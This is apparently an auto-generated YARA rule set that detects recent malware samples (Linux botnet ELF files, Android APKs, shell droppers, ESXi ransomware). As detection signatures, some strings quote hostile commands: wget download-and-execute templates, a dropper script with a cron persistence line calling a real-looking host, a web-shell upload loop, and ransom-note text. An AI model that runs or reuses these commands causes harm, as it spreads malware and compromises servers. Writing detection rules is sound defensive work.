/*
   YARA Rule Set
   Author: Sameer P Sheik
   Date: 2025-01-13
   Identifier: evidences
   Reference: https://datalake.abuse.ch/malware-bazaar/daily/
*/

/* Rule Set ----------------------------------------------------------------- */

rule sig_053c4a9eeca2f2436daf4273a9d8e2f680834e05a9d2eeabcebcfffa17679544 {
   meta:
      description = "evidences - file 053c4a9eeca2f2436daf4273a9d8e2f680834e05a9d2eeabcebcfffa17679544.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "053c4a9eeca2f2436daf4273a9d8e2f680834e05a9d2eeabcebcfffa17679544"
   strings:
      $s1 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" fullword ascii
      $s2 = "HOST: 255.255.255.255:1900" fullword ascii
      $s3 = "service:service-agent" fullword ascii
      $s4 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr" fullword ascii
      $s5 = "/sys/devices/system/cpu" fullword ascii
      $s6 = "ST: urn:dial-multiscreen-org:service:dial:1" fullword ascii
      $s7 = " default" fullword ascii
      $s8 = "watchdog" fullword ascii /* Goodware String - occured 16 times */
      $s9 = "Windows XP" fullword ascii /* Goodware String - occured 134 times */
      $s10 = "/proc/stat" fullword ascii
      $s11 = ".mdebug.abi32" fullword ascii
      $s12 = "/proc/net/tcp" fullword ascii
      $s13 = "C %d R %d A %s" fullword ascii
      $s14 = "TeamSpeak" fullword ascii
      $s15 = "google" fullword ascii /* Goodware String - occured 1 times */
      $s16 = "bye bye" fullword ascii
      $s17 = ".data.rel.ro" fullword ascii /* Goodware String - occured 3 times */
      $s18 = "%s | 3" fullword ascii
      $s19 = "pB4Oec4(" fullword ascii
      $s20 = "%s | 1" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      8 of them
}

rule sig_1e2a4d110fdc4f98687c5e06d2b0d4003929f679ffa05e7d26b2365e92000c10 {
   meta:
      description = "evidences - file 1e2a4d110fdc4f98687c5e06d2b0d4003929f679ffa05e7d26b2365e92000c10.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "1e2a4d110fdc4f98687c5e06d2b0d4003929f679ffa05e7d26b2365e92000c10"
   strings:
      $x1 = "/bin/bash -c \"sleep 10; rm -rf /tmp/%s; wget http://%d.%d.%d.%d/%s -O /tmp/%s; chmod 777 /tmp/%s; /tmp/%s %s > /dev/null 2>&1;" ascii
      $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" fullword ascii
      $s3 = "HOST: 255.255.255.255:1900" fullword ascii
      $s4 = "service:service-agent" fullword ascii
      $s5 = "%s %s > /dev/null 2>&1" fullword ascii
      $s6 = "%s 777 %s > /dev/null 2>&1" fullword ascii
      $s7 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr" fullword ascii
      $s8 = "%s > /dev/null 2>&1" fullword ascii
      $s9 = "/sys/devices/system/cpu" fullword ascii
      $s10 = "ST: urn:dial-multiscreen-org:service:dial:1" fullword ascii
      $s11 = " default" fullword ascii
      $s12 = "watchdog" fullword ascii /* Goodware String - occured 16 times */
      $s13 = "Windows XP" fullword ascii /* Goodware String - occured 134 times */
      $s14 = "/proc/stat" fullword ascii
      $s15 = ".mdebug.abi32" fullword ascii
      $s16 = "/proc/net/tcp" fullword ascii
      $s17 = "C %d R %d A %s" fullword ascii
      $s18 = "TeamSpeak" fullword ascii
      $s19 = "google" fullword ascii /* Goodware String - occured 1 times */
      $s20 = "bye bye" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule sig_5e5b205976b03a708da3dd55172bbd71ea8aae872016075f53b452329c484e3e {
   meta:
      description = "evidences - file 5e5b205976b03a708da3dd55172bbd71ea8aae872016075f53b452329c484e3e.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "5e5b205976b03a708da3dd55172bbd71ea8aae872016075f53b452329c484e3e"
   strings:
      $x1 = "/bin/bash -c \"sleep 10; rm -rf /tmp/%s; wget http://%d.%d.%d.%d/%s -O /tmp/%s; chmod 777 /tmp/%s; /tmp/%s %s > /dev/null 2>&1;" ascii
      $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" fullword ascii
      $s3 = "HOST: 255.255.255.255:1900" fullword ascii
      $s4 = "service:service-agent" fullword ascii
      $s5 = "%s %s > /dev/null 2>&1" fullword ascii
      $s6 = "%s 777 %s > /dev/null 2>&1" fullword ascii
      $s7 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr" fullword ascii
      $s8 = "%s > /dev/null 2>&1" fullword ascii
      $s9 = "%s%d.%d.%d.%d%s" fullword ascii
      $s10 = "/sys/devices/system/cpu" fullword ascii
      $s11 = "ST: urn:dial-multiscreen-org:service:dial:1" fullword ascii
      $s12 = " default" fullword ascii
      $s13 = "watchdog" fullword ascii /* Goodware String - occured 16 times */
      $s14 = "Windows XP" fullword ascii /* Goodware String - occured 134 times */
      $s15 = "/proc/stat" fullword ascii
      $s16 = ".mdebug.abi32" fullword ascii
      $s17 = "/proc/net/tcp" fullword ascii
      $s18 = "C %d R %d A %s" fullword ascii
      $s19 = "TeamSpeak" fullword ascii
      $s20 = "google" fullword ascii /* Goodware String - occured 1 times */
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule sig_6a838a52943218de23020485f7401948a0c403a266d6b2a2ff1828b938544966 {
   meta:
      description = "evidences - file 6a838a52943218de23020485f7401948a0c403a266d6b2a2ff1828b938544966.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "6a838a52943218de23020485f7401948a0c403a266d6b2a2ff1828b938544966"
   strings:
      $x1 = "/bin/bash -c \"sleep 10; rm -rf /tmp/%s; wget http://%d.%d.%d.%d/%s -O /tmp/%s; chmod 777 /tmp/%s; /tmp/%s %s > /dev/null 2>&1;" ascii
      $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" fullword ascii
      $s3 = "HOST: 255.255.255.255:1900" fullword ascii
      $s4 = "service:service-agent" fullword ascii
      $s5 = "%s %s > /dev/null 2>&1" fullword ascii
      $s6 = "%s 777 %s > /dev/null 2>&1" fullword ascii
      $s7 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr" fullword ascii
      $s8 = "%s > /dev/null 2>&1" fullword ascii
      $s9 = "/sys/devices/system/cpu" fullword ascii
      $s10 = "ST: urn:dial-multiscreen-org:service:dial:1" fullword ascii
      $s11 = " default" fullword ascii
      $s12 = "watchdog" fullword ascii /* Goodware String - occured 16 times */
      $s13 = "Windows XP" fullword ascii /* Goodware String - occured 134 times */
      $s14 = "/proc/stat" fullword ascii
      $s15 = "/proc/net/tcp" fullword ascii
      $s16 = "TeamSpeak" fullword ascii
      $s17 = "google" fullword ascii /* Goodware String - occured 1 times */
      $s18 = "C %d R %d A \"%s\"" fullword ascii
      $s19 = "bye bye" fullword ascii
      $s20 = "%s | 1" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule sig_773f77b3dec9437e08cf0aff0871b179bef8d08506504a2a282a8353d1581973 {
   meta:
      description = "evidences - file 773f77b3dec9437e08cf0aff0871b179bef8d08506504a2a282a8353d1581973.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "773f77b3dec9437e08cf0aff0871b179bef8d08506504a2a282a8353d1581973"
   strings:
      $x1 = "/bin/bash -c \"sleep 10; rm -rf /tmp/%s; wget http://%d.%d.%d.%d/%s -O /tmp/%s; chmod 777 /tmp/%s; /tmp/%s %s > /dev/null 2>&1;" ascii
      $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" fullword ascii
      $s3 = "HOST: 255.255.255.255:1900" fullword ascii
      $s4 = "service:service-agent" fullword ascii
      $s5 = "%s %s > /dev/null 2>&1" fullword ascii
      $s6 = "%s 777 %s > /dev/null 2>&1" fullword ascii
      $s7 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr" fullword ascii
      $s8 = "%s > /dev/null 2>&1" fullword ascii
      $s9 = "/sys/devices/system/cpu" fullword ascii
      $s10 = "ST: urn:dial-multiscreen-org:service:dial:1" fullword ascii
      $s11 = " default" fullword ascii
      $s12 = "watchdog" fullword ascii /* Goodware String - occured 16 times */
      $s13 = "Windows XP" fullword ascii /* Goodware String - occured 134 times */
      $s14 = "/proc/stat" fullword ascii
      $s15 = "/proc/net/tcp" fullword ascii
      $s16 = "C %d R %d A %s" fullword ascii
      $s17 = "TeamSpeak" fullword ascii
      $s18 = "google" fullword ascii /* Goodware String - occured 1 times */
      $s19 = "bye bye" fullword ascii
      $s20 = "%s | 1" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule b12286ac0dc1a39351d63176d854a85cdff19e4b6f0254697bf3fcc17e5cfd18 {
   meta:
      description = "evidences - file b12286ac0dc1a39351d63176d854a85cdff19e4b6f0254697bf3fcc17e5cfd18.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "b12286ac0dc1a39351d63176d854a85cdff19e4b6f0254697bf3fcc17e5cfd18"
   strings:
      $s1 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" fullword ascii
      $s2 = "HOST: 255.255.255.255:1900" fullword ascii
      $s3 = "service:service-agent" fullword ascii
      $s4 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr" fullword ascii
      $s5 = "/sys/devices/system/cpu" fullword ascii
      $s6 = "ST: urn:dial-multiscreen-org:service:dial:1" fullword ascii
      $s7 = " default" fullword ascii
      $s8 = "watchdog" fullword ascii /* Goodware String - occured 16 times */
      $s9 = "Windows XP" fullword ascii /* Goodware String - occured 134 times */
      $s10 = "/proc/stat" fullword ascii
      $s11 = "/proc/net/tcp" fullword ascii
      $s12 = "TeamSpeak" fullword ascii
      $s13 = "google" fullword ascii /* Goodware String - occured 1 times */
      $s14 = "C %d R %d A \"%s\"" fullword ascii
      $s15 = "bye bye" fullword ascii
      $s16 = "%s | 3" fullword ascii
      $s17 = "%s | 1" fullword ascii
      $s18 = "*Z$)Tl\"l{" fullword ascii
      $s19 = "F)K~.)" fullword ascii
      $s20 = "%s | 2" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule dde922a53c0fd584c17a298afd97676438d7755c364d5e909faef5b325986e35 {
   meta:
      description = "evidences - file dde922a53c0fd584c17a298afd97676438d7755c364d5e909faef5b325986e35.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "dde922a53c0fd584c17a298afd97676438d7755c364d5e909faef5b325986e35"
   strings:
      $x1 = "/bin/bash -c \"sleep 10; rm -rf /tmp/%s; wget http://%d.%d.%d.%d/%s -O /tmp/%s; chmod 777 /tmp/%s; /tmp/%s %s > /dev/null 2>&1;" ascii
      $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" fullword ascii
      $s3 = "HOST: 255.255.255.255:1900" fullword ascii
      $s4 = "service:service-agent" fullword ascii
      $s5 = "%s %s > /dev/null 2>&1" fullword ascii
      $s6 = "%s 777 %s > /dev/null 2>&1" fullword ascii
      $s7 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr" fullword ascii
      $s8 = "%s > /dev/null 2>&1" fullword ascii
      $s9 = "%s%d.%d.%d.%d%s" fullword ascii
      $s10 = "/sys/devices/system/cpu" fullword ascii
      $s11 = "ST: urn:dial-multiscreen-org:service:dial:1" fullword ascii
      $s12 = " default" fullword ascii
      $s13 = "watchdog" fullword ascii /* Goodware String - occured 16 times */
      $s14 = "Windows XP" fullword ascii /* Goodware String - occured 134 times */
      $s15 = "/proc/stat" fullword ascii
      $s16 = "/proc/net/tcp" fullword ascii
      $s17 = "C %d R %d A %s" fullword ascii
      $s18 = "TeamSpeak" fullword ascii
      $s19 = "google" fullword ascii /* Goodware String - occured 1 times */
      $s20 = "bye bye" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule e3b0263b1545b58725dfde84e5d125ae87b0a14a16c364301af4d91cc068fa12 {
   meta:
      description = "evidences - file e3b0263b1545b58725dfde84e5d125ae87b0a14a16c364301af4d91cc068fa12.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "e3b0263b1545b58725dfde84e5d125ae87b0a14a16c364301af4d91cc068fa12"
   strings:
      $s1 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" fullword ascii
      $s2 = "HOST: 255.255.255.255:1900" fullword ascii
      $s3 = "service:service-agent" fullword ascii
      $s4 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr" fullword ascii
      $s5 = "/sys/devices/system/cpu" fullword ascii
      $s6 = "ST: urn:dial-multiscreen-org:service:dial:1" fullword ascii
      $s7 = " default" fullword ascii
      $s8 = "watchdog" fullword ascii /* Goodware String - occured 16 times */
      $s9 = "Windows XP" fullword ascii /* Goodware String - occured 134 times */
      $s10 = "/proc/stat" fullword ascii
      $s11 = "/proc/net/tcp" fullword ascii
      $s12 = "C %d R %d A %s" fullword ascii
      $s13 = "TeamSpeak" fullword ascii
      $s14 = "google" fullword ascii /* Goodware String - occured 1 times */
      $s15 = "bye bye" fullword ascii
      $s16 = "%s | 3" fullword ascii
      $s17 = "%s | 1" fullword ascii
      $s18 = "*Z$)Tl\"l{" fullword ascii
      $s19 = "F)K~.)" fullword ascii
      $s20 = "%s | 2" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule f25b7f11e9f34ee5d91b3e07ba22925022e8b8b05c3ddf6672ae86e5144481cf {
   meta:
      description = "evidences - file f25b7f11e9f34ee5d91b3e07ba22925022e8b8b05c3ddf6672ae86e5144481cf.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "f25b7f11e9f34ee5d91b3e07ba22925022e8b8b05c3ddf6672ae86e5144481cf"
   strings:
      $x1 = "/bin/sh -c 'esxcli system coredump file set --unconfigure'" fullword ascii
      $s2 = "1. Install TOR Browser to get access to our chat room - https://www.torproject.org/download/." fullword ascii
      $s3 = "4. As for your data, if we fail to agree, we will try to sell personal information/trade secrets/databases/source codes - genera" ascii
      $s4 = "/bin/sh -c 'esxcli system syslog config set --logdir=/tmp'" fullword ascii
      $s5 = "/bin/sh -c 'esxcli system syslog reload'" fullword ascii
      $s6 = "2. Paying us you save your TIME, MONEY, EFFORTS and be back on track within 24 hours approximately. Our decryptor works properly" ascii
      $s7 = "__pthread_mutex_unlock_usercnt" fullword ascii
      $s8 = "type == PTHREAD_MUTEX_ERRORCHECK_NP" fullword ascii
      $s9 = "1. Dealing with us you will save A LOT due to we are not interested in ruining your financially. We will study in depth your fin" ascii
      $s10 = "PTHREAD_MUTEX_TYPE (mutex) == PTHREAD_MUTEX_ERRORCHECK_NP" fullword ascii
      $s11 = "N6spdlog5sinks15basic_file_sinkISt5mutexEE" fullword ascii
      $s12 = "N6spdlog5sinks21ansicolor_stdout_sinkINS_7details13console_mutexEEE" fullword ascii
      $s13 = "INTERNAL_SYSCALL_ERRNO (e, __err) != EDEADLK || (kind != PTHREAD_MUTEX_ERRORCHECK_NP && kind != PTHREAD_MUTEX_RECURSIVE_NP)" fullword ascii
      $s14 = "N6spdlog5sinks9base_sinkISt5mutexEE" fullword ascii
      $s15 = "hed in our blog - https://akiral2iz6a7qgd3ayp3l6yub7xx2uep76idk3u2kollpj5z3z636bad.onion." fullword ascii
      $s16 = "St23_Sp_counted_ptr_inplaceIN6spdlog5sinks21ansicolor_stdout_sinkINS0_7details13console_mutexEEESaIS5_ELN9__gnu_cxx12_Lock_polic" ascii
      $s17 = "St23_Sp_counted_ptr_inplaceIN6spdlog5sinks21ansicolor_stdout_sinkINS0_7details13console_mutexEEESaIS5_ELN9__gnu_cxx12_Lock_polic" ascii
      $s18 = "N6spdlog5sinks14ansicolor_sinkINS_7details13console_mutexEEE" fullword ascii
      $s19 = "St23_Sp_counted_ptr_inplaceIN6spdlog5sinks15basic_file_sinkISt5mutexEESaIS4_ELN9__gnu_cxx12_Lock_policyE2EE" fullword ascii
      $s20 = "Unexpected error %d on netlink descriptor %d (address family %d)." fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 10000KB and
      1 of ($x*) and 4 of them
}

rule sig_228e715b42f28f3224f7706a6f68fb72c7a5797760212e0a706e8848598579ef {
   meta:
      description = "evidences - file 228e715b42f28f3224f7706a6f68fb72c7a5797760212e0a706e8848598579ef.apk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "228e715b42f28f3224f7706a6f68fb72c7a5797760212e0a706e8848598579ef"
   strings:
      $s1 = "II1050109021929-qklglsvs6k4gj10isuh3ipklopkoen69.apps.googleusercontent.com" fullword ascii
      $s2 = "$$Download Success Get %d Host Records" fullword ascii
      $s3 = "execute once failure in __cxa_get_globals_fast()" fullword ascii
      $s4 = "55https://api-5874083157835505386-758464.firebaseio.com" fullword ascii
      $s5 = "22Base.Widget.AppCompat.Button.ButtonBar.AlertDialog" fullword ascii
      $s6 = "mutex lock failed" fullword ascii
      $s7 = "00Base.Widget.AppCompat.CompoundButton.RadioButton" fullword ascii
      $s8 = "fab_elevationCompat" fullword ascii
      $s9 = "Fazer login com o Google" fullword ascii
      $s10 = "recursive_mutex constructor failed" fullword ascii
      $s11 = "_ZNSt6__ndk118condition_variable15__do_timed_waitERNS_11unique_lockINS_5mutexEEENS_6chrono10time_pointINS5_12system_clockENS5_8d" ascii
      $s12 = "__cxa_guard_abort failed to release mutex" fullword ascii
      $s13 = "__cxa_guard_acquire failed to acquire mutex" fullword ascii
      $s14 = "_ZNSt6__ndk118condition_variable15__do_timed_waitERNS_11unique_lockINS_5mutexEEENS_6chrono10time_pointINS5_12system_clockENS5_8d" ascii
      $s15 = "_ZNSt6__ndk118condition_variable15__do_timed_waitERNS_11unique_lockINS_5mutexEEENS_6chrono10time_pointINS5_12system_clockENS5_8d" ascii
      $s16 = "recursive_mutex lock failed" fullword ascii
      $s17 = "__cxa_guard_release failed to acquire mutex" fullword ascii
      $s18 = "__cxa_guard_release failed to release mutex" fullword ascii
      $s19 = "_ZN8SandHook17TrampolineManager17allocExecuteSpaceEj" fullword ascii
      $s20 = "**api-5874083157835505386-758464.appspot.com" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 13000KB and
      8 of them
}

rule sig_05eaeb3244b1b7837b13729e8ffa0119692749ff0652c00161a0a344f8c70842 {
   meta:
      description = "evidences - file 05eaeb3244b1b7837b13729e8ffa0119692749ff0652c00161a0a344f8c70842.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "05eaeb3244b1b7837b13729e8ffa0119692749ff0652c00161a0a344f8c70842"
   strings:
      $s1 = "echo \"Upload process completed. Domains with successful uploads are saved in $LOG_FILE.\"" fullword ascii
      $s2 = "LOG_FILE=\"uploaded_domains.txt\"" fullword ascii
      $s3 = "# File to log successfully uploaded domains" fullword ascii
      $s4 = "# Clear the log file if it exists" fullword ascii
      $s5 = "# Get a list of all domains" fullword ascii
      $s6 = "DOMAINS=$(plesk bin domain --list)" fullword ascii
      $s7 = "# Loop through each domain and upload the file" fullword ascii
      $s8 = "# Define the file to upload" fullword ascii
      $s9 = "FILE_TO_UPLOAD=\"/2pac.php\"" fullword ascii
      $s10 = "    DOMAIN_PATH=\"/var/www/vhosts/$DOMAIN/httpdocs\"" fullword ascii
      $s11 = "    if [ -d \"$DOMAIN_PATH\" ]; then" fullword ascii
      $s12 = "> $LOG_FILE" fullword ascii
      $s13 = "        echo $DOMAIN >> $LOG_FILE" fullword ascii
      $s14 = "#!/bin/bash" fullword ascii
      $s15 = "        # Upload the file to the document root" fullword ascii
      $s16 = "    # Construct the expected document root path" fullword ascii
      $s17 = "        # Append the domain to the log file" fullword ascii
      $s18 = "for DOMAIN in $DOMAINS; do" fullword ascii
      $s19 = "        echo \"Upload path for $DOMAIN does not exist\"" fullword ascii
      $s20 = "        echo \"File uploaded to $DOMAIN_PATH/ for $DOMAIN\"" fullword ascii
   condition:
      uint16(0) == 0x2123 and filesize < 2KB and
      8 of them
}

rule sig_58c0de42aef134a9318749c6c7cd1471b56e36de8a9b548b8c795e0600686e21 {
   meta:
      description = "evidences - file 58c0de42aef134a9318749c6c7cd1471b56e36de8a9b548b8c795e0600686e21.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "58c0de42aef134a9318749c6c7cd1471b56e36de8a9b548b8c795e0600686e21"
   strings:
      $s1 = "$a -O /tmp/ds.sh http://bookkeeping.wannanxi.com/ds.sh" fullword ascii
      $s2 = "$a http://bookkeeping.wannanxi.com/web/web.sh -P /tmp" fullword ascii
      $s3 = "($c -l 2>/dev/null; echo \"0 0 * * * /tmp/ds.sh\") | $c -" fullword ascii
      $s4 = "($c -l 2>/dev/null; echo \"0 0 * * * /ds.sh\") | $c -" fullword ascii
      $s5 = "bash /tmp/web.sh" fullword ascii
      $s6 = "$b 777 /tmp/ds.sh" fullword ascii
      $s7 = "$b 777 /tmp/web.sh" fullword ascii
      $s8 = "a=\"wget\"" fullword ascii
      $s9 = "#!/bin/bash" fullword ascii
      $s10 = "b=\"chmod\"" fullword ascii
      $s11 = "c=\"crontab\"" fullword ascii
   condition:
      uint16(0) == 0x2123 and filesize < 1KB and
      8 of them
}

rule sig_21b9ee90d26b44f4044fd53567cddfe6d17317ee8ed9d6131f92b2a56ce36478 {
   meta:
      description = "evidences - file 21b9ee90d26b44f4044fd53567cddfe6d17317ee8ed9d6131f92b2a56ce36478.apk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "21b9ee90d26b44f4044fd53567cddfe6d17317ee8ed9d6131f92b2a56ce36478"
   strings:
      $s1 = "Execute shell command" fullword ascii
      $s2 = "ttcommand NOT EXECUTED. To get this feature your device must be rooted and you have to install Cerberus in /system/app" fullword ascii
      $s3 = "HH999803017449-dpmeafjia6oicp5m2p8s8qtgmbq144i0.apps.googleusercontent.com" fullword ascii
      $s4 = ",,command NOT EXECUTED. Service not available." fullword ascii
      $s5 = "77commande NON EXECUTEE. Le service n'est pas disponible." fullword ascii
      $s6 = "\"\"command_not_executed_start_service" fullword ascii
      $s7 = " connesso a internet, puoi fare il login su www.cerberusapp.com da un computer o altro dispositivo e inviare i comandi dall'inte" ascii
      $s8 = "1. jika perangkat Anda terhubung ke internet, Anda dapat login ke www.cerberusapp.com dari komputer atau perangkat lain dan meng" ascii
      $s9 = "1. jika perangkat Anda terhubung ke internet, Anda dapat login ke www.cerberusapp.com dari komputer atau perangkat lain dan meng" ascii
      $s10 = " connesso a internet, puoi fare il login su www.cerberusapp.com da un computer o altro dispositivo e inviare i comandi dall'inte" ascii
      $s11 = "Executar comando da shell" fullword ascii
      $s12 = "Als je apparaat verbonden is met internet, kan je inloggen op www.cerberusapp.com vanaf een computer of een andere apparaat en c" ascii
      $s13 = "Executar comando shell" fullword ascii
      $s14 = "EEcommand NOT EXECUTED. To get this feature your device must be rooted." fullword ascii
      $s15 = "command_not_executed" fullword ascii
      $s16 = "command_not_executed2" fullword ascii
      $s17 = "==command NOT EXECUTED. Have you enabled device administration?" fullword ascii
      $s18 = "- www.cerberusapp.com" fullword ascii
      $s19 = "command_not_executed4" fullword ascii
      $s20 = "command_not_executed3" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 20000KB and
      8 of them
}

rule sig_24ef1bdbb71aba9f8c50b5df76df9bd7c0f6782a50ef5caacbb3075f76845340 {
   meta:
      description = "evidences - file 24ef1bdbb71aba9f8c50b5df76df9bd7c0f6782a50ef5caacbb3075f76845340.apk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "24ef1bdbb71aba9f8c50b5df76df9bd7c0f6782a50ef5caacbb3075f76845340"
   strings:
      $s1 = "OOThemeOverlay.MaterialComponents.MaterialAlertDialog.Picker.Date.Header.Text.Day" fullword ascii
      $s2 = "HH443032412827-apod96e3m5vmnfqopakg2hkbn1h2u792.apps.googleusercontent.com" fullword ascii
      $s3 = "11Widget.MaterialComponents.Button.UnelevatedButton" fullword ascii
      $s4 = "66Widget.MaterialComponents.Button.UnelevatedButton.Icon" fullword ascii
      $s5 = "KKThemeOverlay.MaterialComponents.MaterialAlertDialog.Picker.Date.Header.Text" fullword ascii
      $s6 = "  passwordToggleContentDescription" fullword ascii
      $s7 = "##password_toggle_content_description" fullword ascii
      $s8 = "  https://oil-price.firebaseio.com" fullword ascii
      $s9 = "22Base.Widget.AppCompat.Button.ButtonBar.AlertDialog" fullword ascii
      $s10 = "22Widget.MaterialComponents.Button.TextButton.Dialog" fullword ascii
      $s11 = "88Widget.MaterialComponents.Button.TextButton.Dialog.Flush" fullword ascii
      $s12 = "77Widget.MaterialComponents.Button.TextButton.Dialog.Icon" fullword ascii
      $s13 = "res/drawable/design_password_eye.xml" fullword ascii
      $s14 = "$$res/drawable/design_password_eye.xml" fullword ascii
      $s15 = "00Base.Widget.AppCompat.CompoundButton.RadioButton" fullword ascii
      $s16 = "44Widget.MaterialComponents.CompoundButton.RadioButton" fullword ascii
      $s17 = "%%res/layout/test_toolbar_elevation.xml" fullword ascii
      $s18 = "44Widget.MaterialComponents.NavigationRailView.Compact" fullword ascii
      $s19 = "GGThemeOverlay.MaterialComponents.MaterialAlertDialog.Picker.Date.Spinner" fullword ascii
      $s20 = "11Widget.MaterialComponents.CompoundButton.CheckBox" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 23000KB and
      8 of them
}

rule sig_4526effc1cd2597885c2787b1ca78a73ef17e066028a660ae70aa452292dc564 {
   meta:
      description = "evidences - file 4526effc1cd2597885c2787b1ca78a73ef17e066028a660ae70aa452292dc564.apk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "4526effc1cd2597885c2787b1ca78a73ef17e066028a660ae70aa452292dc564"
   strings:
      $s1 = "OOThemeOverlay.MaterialComponents.MaterialAlertDialog.Picker.Date.Header.Text.Day" fullword ascii
      $s2 = "11Widget.MaterialComponents.Button.UnelevatedButton" fullword ascii
      $s3 = "66Widget.MaterialComponents.Button.UnelevatedButton.Icon" fullword ascii
      $s4 = "KKThemeOverlay.MaterialComponents.MaterialAlertDialog.Picker.Date.Header.Text" fullword ascii
      $s5 = "  passwordToggleContentDescription" fullword ascii
      $s6 = "##password_toggle_content_description" fullword ascii
      $s7 = "m3_alert_dialog_elevation" fullword ascii
      $s8 = "22Base.Widget.AppCompat.Button.ButtonBar.AlertDialog" fullword ascii
      $s9 = "22Widget.MaterialComponents.Button.TextButton.Dialog" fullword ascii
      $s10 = "88Widget.MaterialComponents.Button.TextButton.Dialog.Flush" fullword ascii
      $s11 = "77Widget.MaterialComponents.Button.TextButton.Dialog.Icon" fullword ascii
      $s12 = "res/drawable/design_password_eye.xml" fullword ascii
      $s13 = "$$res/drawable/design_password_eye.xml" fullword ascii
      $s14 = "00Base.Widget.AppCompat.CompoundButton.RadioButton" fullword ascii
      $s15 = "44Widget.MaterialComponents.CompoundButton.RadioButton" fullword ascii
      $s16 = "%%res/layout/test_toolbar_elevation.xml" fullword ascii
      $s17 = "44Widget.MaterialComponents.NavigationRailView.Compact" fullword ascii
      $s18 = "GGThemeOverlay.MaterialComponents.MaterialAlertDialog.Picker.Date.Spinner" fullword ascii
      $s19 = "11Widget.MaterialComponents.CompoundButton.CheckBox" fullword ascii
      $s20 = "00Base.Widget.Material3.CompoundButton.RadioButton" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 16000KB and
      8 of them
}

rule e666a26f17bf00c53923de4aba1a0633c851ad0c1c1dd0316ac53ca03ba8ab91 {
   meta:
      description = "evidences - file e666a26f17bf00c53923de4aba1a0633c851ad0c1c1dd0316ac53ca03ba8ab91.apk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "e666a26f17bf00c53923de4aba1a0633c851ad0c1c1dd0316ac53ca03ba8ab91"
   strings:
      $s1 = "android@android.com" fullword ascii
      $s2 = "ooooll" fullword ascii /* reversed goodware string 'lloooo' */
      $s3 = "WWWWVV" fullword ascii /* reversed goodware string 'VVWWWW' */
      $s4 = "android@android.com0" fullword ascii
      $s5 = "ysyyyyy" fullword ascii
      $s6 = "com.slow.stoper" fullword wide
      $s7 = "colorPrimaryDark" fullword ascii
      $s8 = "Zeeeeye-" fullword ascii
      $s9 = "2???333??" fullword ascii /* hex encoded string '#3' */
      $s10 = "jqbrpdt" fullword ascii
      $s11 = "tskomssumkcg" fullword ascii
      $s12 = "hqeuurfz" fullword ascii
      $s13 = "rymmmqq" fullword ascii
      $s14 = "pkkkyyycc" fullword ascii
      $s15 = "mmmiiiqqqeee" fullword ascii
      $s16 = "driiiqqquuuyy" fullword ascii
